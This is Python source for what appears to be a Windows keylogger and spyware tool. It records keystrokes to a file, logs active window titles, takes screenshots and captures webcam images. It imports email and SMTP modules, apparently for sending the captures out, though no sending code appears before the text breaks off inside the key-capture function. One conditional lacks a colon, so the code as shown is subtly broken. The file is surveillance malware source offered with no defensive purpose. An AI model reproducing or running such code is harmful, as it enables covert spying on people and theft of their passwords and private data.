import keyboard
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import platform
import socket
from requests import get
import logging
from PIL import ImageGrab
import os
import psutil
import win32gui
from datetime import datetime
from dotenv import load_dotenv
import cv2 




load_dotenv()

active_apps = {}

def get_active_app_name():
    active_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    return active_app

def screenshot():
    im = ImageGrab.grab()
    im.save("screenshot.png")

def ensure_file_access(path):
    """
    Ensure file exists and is readable. If not present, create an empty file.
    Returns True if file exists and is readable, False otherwise.
    """
    try:
        if not os.path.exists(path)
            open(path, "w").close()
        with open(path, "rb"):
            pass
        return True
    except Exception as e:
        print(f"Warning: cannot access {path}: {e}")
        return False



def capture_camera(filename="webcam.png", timeout_secs=5):
    """
    Capture a single frame from the default webcam and save to filename.
    Returns True on success, False otherwise.
    """
    try:
        cap = cv2.VideoCapture(0)
        start = time.time()
        while time.time() - start < timeout_secs and not cap.isOpened():
            time.sleep(0.1)
        if not cap.isOpened():
            print("Warning: webcam not accessible.")
            return False
        ret, frame = cap.read()
        if not ret or frame is None:
            print("Warning: failed to read frame from webcam.")
            cap.release()
            return False
        cv2.imwrite(filename, frame)
        cap.release()
        return True
    except Exception as e:
        print(f"Warning: webcam capture failed: {e}")
        try:
            cap.release()
        except Exception:
            pass
        return False

def capture_keys():
    keys = []
    start_time = time.time()
    
    def on_key_press(event):
        nonlocal keys
        if event.name == 'space':
            keys.append(' ')
        else:
            keys.append(event.name)
        active_app = get_active_app_name()
        if active_app:
            active_apps[event.time] = active_app

    def write_to_file():
        nonlocal keys
        with open('document.txt', 'a') as file:
            file.write(''.join(keys))
            keys.clear()

    def write_application_log():
        with open('applicationLog.txt', 'a') as file:
            for timestamp, app_name in active_apps.items():
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                file.write(f"Timestamp: {current_time}, Application: {app_name}\n")
            active_apps.clear()

            